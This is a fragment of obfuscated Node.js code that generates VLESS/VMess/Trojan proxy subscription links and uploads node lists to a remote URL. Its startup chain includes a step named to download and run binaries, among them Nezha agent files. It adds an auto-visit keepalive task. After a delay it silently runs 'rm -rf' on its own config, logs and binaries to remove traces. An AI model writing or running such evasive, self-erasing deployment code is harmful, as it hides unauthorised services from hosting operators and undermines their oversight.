axios['get'](_0x5d8393(0x1ee),{'timeout':0xbb8});if(_0x179580[_0x5d8393(_0xd12ca._0xd343ff)]&&_0x179580[_0x5d8393(0x28f)][_0x5d8393(0x28d)]==='success'&&_0x179580[_0x5d8393(_0xd12ca._0x5e1c43)][_0x5d8393(_0xd12ca._0x19c1be)]&&_0x179580[_0x5d8393(0x28f)][_0x5d8393(_0xd12ca._0x53a649)])return _0x179580[_0x5d8393(0x28f)]['countryCode']+'_'+_0x179580['data'][_0x5d8393(_0xd12ca._0x3e5c35)];}catch(_0x1084f4){}}return _0x5d8393(0x27c);}async function _0x2169fb(_0x33859a){const _0x4d1750={_0x1384a7:0x1d2,_0x4130a1:0x246,_0x35145e:0x24d,_0x3c0257:0x1f6,_0x35cc82:0x253,_0x2a5d0b:0x222,_0x3d48ad:0x27a,_0x275d18:0x279,_0x3ee2a4:0x1ef,_0x134062:0x253,_0x5379b7:0x27a,_0x17b8c9:0x20d},_0x577aa7=await _0x13633e(),_0x452ce9=NAME?NAME+'-'+_0x577aa7:_0x577aa7;return new Promise(_0x596a6b=>{const _0x5a5def={_0x101093:0x27a,_0x4d54e8:0x1ce,_0x2964b1:0x271,_0x4f9a9b:0x1f5};setTimeout(()=>{const _0x437f1d=_0x3d83,_0x122eb4={'v':'2','ps':''+_0x452ce9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x437f1d(_0x4d1750._0x1384a7),'net':'ws','type':_0x437f1d(0x1d2),'host':_0x33859a,'path':_0x437f1d(_0x4d1750._0x4130a1),'tls':'tls','sni':_0x33859a,'alpn':'','fp':_0x437f1d(_0x4d1750._0x35145e)},_0x6839fd=_0x437f1d(_0x4d1750._0x3c0257)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x33859a+_0x437f1d(_0x4d1750._0x35cc82)+_0x33859a+_0x437f1d(_0x4d1750._0x2a5d0b)+_0x452ce9+_0x437f1d(0x25a)+Buffer[_0x437f1d(_0x4d1750._0x3d48ad)](JSON['stringify'](_0x122eb4))[_0x437f1d(0x1ce)](_0x437f1d(0x1fa))+_0x437f1d(_0x4d1750._0x275d18)+UUID+'@'+CFIP+':'+CFPORT+_0x437f1d(_0x4d1750._0x3ee2a4)+_0x33859a+_0x437f1d(_0x4d1750._0x134062)+_0x33859a+_0x437f1d(0x1ea)+_0x452ce9+'\x0a\x20\x20\x20\x20';console[_0x437f1d(0x1f3)](Buffer[_0x437f1d(_0x4d1750._0x5379b7)](_0x6839fd)['toString'](_0x437f1d(0x1fa))),fs[_0x437f1d(_0x4d1750._0x17b8c9)](subPath,Buffer[_0x437f1d(0x27a)](_0x6839fd)[_0x437f1d(0x1ce)]('base64')),console['log'](FILE_PATH+_0x437f1d(0x258)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4d5bc2,_0x5a0c3f)=>{const _0x5d8784=_0x437f1d,_0x57207e=Buffer[_0x5d8784(_0x5a5def._0x101093)](_0x6839fd)[_0x5d8784(_0x5a5def._0x4d54e8)]('base64');_0x5a0c3f[_0x5d8784(_0x5a5def._0x2964b1)](_0x5d8784(0x272),_0x5d8784(0x1f8)),_0x5a0c3f[_0x5d8784(_0x5a5def._0x4f9a9b)](_0x57207e);}),_0x596a6b(_0x6839fd);},0x7d0);});}}async function uploadNodes(){const _0x565b8a={_0x3e8abd:0x241,_0x2831ab:0x25b,_0x371ec0:0x28d,_0x1150d3:0x1f3,_0x3a8853:0x26f},_0x861703=_0x2d9083;if(UPLOAD_URL&&PROJECT_URL){const _0x2fddc7=PROJECT_URL+'/'+SUB_PATH,_0x1df861={'subscription':[_0x2fddc7]};try{const _0x9a3b98=await axios[_0x861703(_0x565b8a._0x3e8abd)](UPLOAD_URL+'/api/add-subscriptions',_0x1df861,{'headers':{'Content-Type':_0x861703(0x281)}});return _0x9a3b98&&_0x9a3b98['status']===0xc8?(console[_0x861703(0x1f3)](_0x861703(_0x565b8a._0x2831ab)),_0x9a3b98):null;}catch(_0x45c700){if(_0x45c700['response']){if(_0x45c700['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x861703(0x280)](listPath))return;const _0x2f9559=fs[_0x861703(0x238)](listPath,'utf-8'),_0x527f65=_0x2f9559[_0x861703(0x262)]('\x0a')[_0x861703(0x1fc)](_0x567b2f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x861703(0x1fe)](_0x567b2f));if(_0x527f65['length']===0x0)return;const _0x4e7931=JSON[_0x861703(0x225)]({'nodes':_0x527f65});try{const _0x496c63=await axios[_0x861703(_0x565b8a._0x3e8abd)](UPLOAD_URL+'/api/add-nodes',_0x4e7931,{'headers':{'Content-Type':'application/json'}});return _0x496c63&&_0x496c63[_0x861703(_0x565b8a._0x371ec0)]===0xc8?(console[_0x861703(_0x565b8a._0x1150d3)](_0x861703(_0x565b8a._0x3a8853)),_0x496c63):null;}catch(_0x44ebcd){return null;}}else return;}}function cleanFiles(){const _0x34cc2d={_0x554622:0x21f,_0x9b1224:0x1f2},_0x17982c={_0x2db322:0x1d6,_0x5f24fc:0x284};setTimeout(()=>{const _0x39756f={_0x2679aa:0x25c,_0x67608e:0x1f3,_0x1700f7:0x1f3},_0x200c13=_0x3d83,_0x957be6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x957be6[_0x200c13(0x249)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x957be6[_0x200c13(0x249)](phpPath);process[_0x200c13(_0x34cc2d._0x554622)]==='win32'?exec(_0x200c13(_0x34cc2d._0x9b1224)+_0x957be6['join']('\x20')+'\x20>\x20nul\x202>&1',_0x506a8c=>{const _0x3f6ce6=_0x200c13;console[_0x3f6ce6(_0x39756f._0x2679aa)](),console[_0x3f6ce6(_0x39756f._0x67608e)](_0x3f6ce6(0x1d6)),console[_0x3f6ce6(_0x39756f._0x1700f7)](_0x3f6ce6(0x284));}):exec('rm\x20-rf\x20'+_0x957be6[_0x200c13(0x28b)]('\x20')+_0x200c13(0x220),_0x24763c=>{const _0x2b5e22=_0x200c13;console[_0x2b5e22(0x25c)](),console[_0x2b5e22(0x1f3)](_0x2b5e22(_0x17982c._0x2db322)),console['log'](_0x2b5e22(_0x17982c._0x5f24fc));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x35752f={_0x3ca059:0x281,_0x458038:0x1f3,_0x29b4c1:0x289,_0x4f70ab:0x285},_0x1ac62f=_0x2d9083;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1ac62f(0x1f3)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x44c1f6=await axios[_0x1ac62f(0x241)](_0x1ac62f(0x204),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1ac62f(_0x35752f._0x3ca059)}});return console[_0x1ac62f(_0x35752f._0x458038)](_0x1ac62f(_0x35752f._0x29b4c1)),_0x44c1f6;}catch(_0x2d5179){return console[_0x1ac62f(0x28a)](_0x1ac62f(_0x35752f._0x4f70ab)+_0x2d5179[_0x1ac62f(0x215)]),null;}}async function startserver(){const _0x32df7c=_0x2d9083;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3267b1){console['error'](_0x32df7c(0x1e9),_0x3267b1);}}startserver()[_0x2d9083(0x1f4)](_0x3c92c5=>{const _0x2d9be4={_0x25c810:0x28a,_0x341934:0x22a},_0x27e8cf=_0x2d9083;console[_0x27e8cf(_0x2d9be4._0x25c810)](_0x27e8cf(_0x2d9be4._0x341934),_0x3c92c5);}),app['listen'](PORT,()=>console[_0x2d9083(0x1f3)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
